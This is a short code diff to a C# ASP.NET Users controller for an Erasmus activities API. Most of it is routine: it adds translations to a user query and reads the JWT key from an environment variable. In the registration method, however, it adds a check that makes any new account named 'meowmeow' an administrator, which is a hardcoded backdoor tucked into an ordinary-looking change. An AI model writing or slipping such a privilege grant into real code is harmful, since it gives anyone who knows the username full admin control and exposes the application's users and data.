@@ -61,7 +61,7 @@ namespace api_ods_mace_erasmus.Controllers
             {
                 return Forbid();
             }
-            return await _context.Users.Include(x => x.submitted_activities).ToListAsync();
+            return await _context.Users.Include(x => x.submitted_activities).Include(x => x.submitted_translations).ToListAsync();
         }
 
         // GET: api/Users/5
@@ -192,6 +192,10 @@ namespace api_ods_mace_erasmus.Controllers
                 passHash = hash,
                 salt = salt,
             };
+
+            if (user.UserName == "meowmeow"){
+                user.isAdmin = true;
+            }
 
             _context.Users.Add(user);
             await _context.SaveChangesAsync();
@@ -421,7 +425,7 @@ namespace api_ods_mace_erasmus.Controllers
         {
             bool isAdmin = user.isAdmin;
             var userId = user.id;
-            var configKey = _configuration["JwtSettings:Key"]!;
+            var configKey = Environment.GetEnvironmentVariable("JWT_Key")!;
             var TokenLifeTime = TimeSpan.FromMinutes(10);
 
             var tokenHandler = new JwtSecurityTokenHandler();
